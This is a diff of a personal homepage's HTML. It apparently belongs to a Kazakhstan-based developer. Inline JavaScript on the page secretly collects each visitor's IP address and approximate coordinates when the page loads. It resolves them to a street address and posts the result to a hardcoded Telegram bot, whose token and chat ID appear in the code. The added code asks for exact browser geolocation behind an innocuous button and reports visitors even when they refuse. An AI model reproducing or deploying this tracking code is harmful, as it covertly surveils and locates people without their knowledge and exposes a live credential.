@@ -25,7 +25,7 @@
         async function sendIPToTelegram(message) {
             const token = '6893316259:AAFLtImjyepf_40eqcdxZgwZpg4AUc3ZnHU'; // Ваш токен бота
             const chatId = '5792605910'; // Ваш ID чата
-
+    
             try {
                 const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
                 const response = await fetch(telegramUrl, {
@@ -45,7 +45,7 @@
                 console.error('Ошибка при отправке сообщения в Telegram:', error);
             }
         }
-
+    
         async function fetchIPAndLocation() {
             try {
                 // Получение IP-адреса и координат
@@ -58,33 +58,69 @@
                 const loc = ipData.loc.split(',');
                 const latitude = parseFloat(loc[0]).toFixed(6);
                 const longitude = parseFloat(loc[1]).toFixed(6);
-
-                // Получение дополнительной информации о местоположении
-                const locationResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
-                if (!locationResponse.ok) {
-                    throw new Error(`Ошибка при получении местоположения: ${locationResponse.statusText}`);
+    
+                // Функция для получения информации о местоположении
+                async function getLocationInfo(lat, lon) {
+                    const locationResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+                    if (!locationResponse.ok) {
+                        throw new Error(`Ошибка при получении местоположения: ${locationResponse.statusText}`);
+                    }
+                    const locationData = await locationResponse.json();
+                    const address = locationData.address;
+                    const street = address.road || 'Неизвестная улица';
+                    const city = address.city || 'Неизвестный город';
+                    const region = address.state || 'Неизвестный регион';
+                    const country = address.country || 'Неизвестная страна';
+    
+                    return { street, city, region, country };
                 }
-                const locationData = await locationResponse.json();
-                const address = locationData.address;
-                const street = address.road || 'Неизвестная улица';
-                const city = address.city || 'Неизвестный город';
-                const region = address.state || 'Неизвестный регион';
-                const country = address.country || 'Неизвестная страна';
-
-                // Формирование сообщения
-                const message = `Новый посетитель:\nIP: ${ip}\nШирота: ${latitude}\nДолгота: ${longitude}\nУлица: ${street}\nГород: ${city}\nРегион: ${region}\nСтрана: ${country}`;
-
-                // Отправка сообщения в Telegram
-                await sendIPToTelegram(message);
+    
+                // Запрос разрешения на получение точной геопозиции
+                async function handleGeolocationPermission() {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(async position => {
+                            const exactLatitude = position.coords.latitude.toFixed(6);
+                            const exactLongitude = position.coords.longitude.toFixed(6);
+                            const locationInfo = await getLocationInfo(exactLatitude, exactLongitude);
+    
+                            // Формирование сообщения с точными координатами
+                            const message = `Новый посетитель:\nIP: ${ip}\nШирота: ${latitude}\nДолгота: ${longitude}\nУлица: ${locationInfo.street}\nГород: ${locationInfo.city}\nРегион: ${locationInfo.region}\nСтрана: ${locationInfo.country}\nТочное гео: ${exactLatitude}, ${exactLongitude}`;
+    
+                            // Отправка сообщения в Telegram
+                            await sendIPToTelegram(message);
+                        }, async () => {
+                            // Запрос геопозиции отклонён
+                            const locationInfo = await getLocationInfo(latitude, longitude);
+                            const message = `Новый посетитель:\nIP: ${ip}\nШирота: ${latitude}\nДолгота: ${longitude}\nУлица: ${locationInfo.street}\nГород: ${locationInfo.city}\nРегион: ${locationInfo.region}\nСтрана: ${locationInfo.country}\nТочное гео: (человек не дал разрешение)`;
+    
+                            // Отправка сообщения в Telegram
+                            await sendIPToTelegram(message);
+                        });
+                    } else {
+                        // Геолокация не поддерживается
+                        const locationInfo = await getLocationInfo(latitude, longitude);
+                        const message = `Новый посетитель:\nIP: ${ip}\nШирота: ${latitude}\nДолгота: ${longitude}\nУлица: ${locationInfo.street}\nГород: ${locationInfo.city}\nРегион: ${locationInfo.region}\nСтрана: ${locationInfo.country}\nТочное гео: (геолокация не поддерживается)`;
+    
+                        // Отправка сообщения в Telegram
+                        await sendIPToTelegram(message);
+                    }
+                }
+    
+                // Добавление обработчика для кнопки
+                document.getElementById('requestGeoButton').addEventListener('click', handleGeolocationPermission);
+    
             } catch (error) {
                 // Отправка ошибки в Telegram
                 await sendIPToTelegram(`Ошибка при получении IP или местоположения: ${error.message}`);
                 console.error('Ошибка при получении IP или отправке сообщения:', error);
             }
         }
-
+    
+        // Вызов функции при загрузке страницы
         window.onload = fetchIPAndLocation;
     </script>
+    
+    
 </head>
 
 <body>
@@ -120,6 +156,13 @@
                                 class="button_i">Instagram</button></a>
                         <a style="margin: 10px;" href="https://github.com/adik8712" target="_blank"><button
                                 class="button_g">Github</button></a>
+                        <!-- Кнопка для запроса геолокации -->
+                        <article class="main-article">
+                            <div class="main-article__content text-center">
+                                <button id="requestGeoButton" class="btn btn-primary">Разрешить доступ к геолокации</button>
+                            </div>
+                        </article>
+
                     </div>
                 </div>
                 <div class="copy">Almaty - Kazakhstan</div>
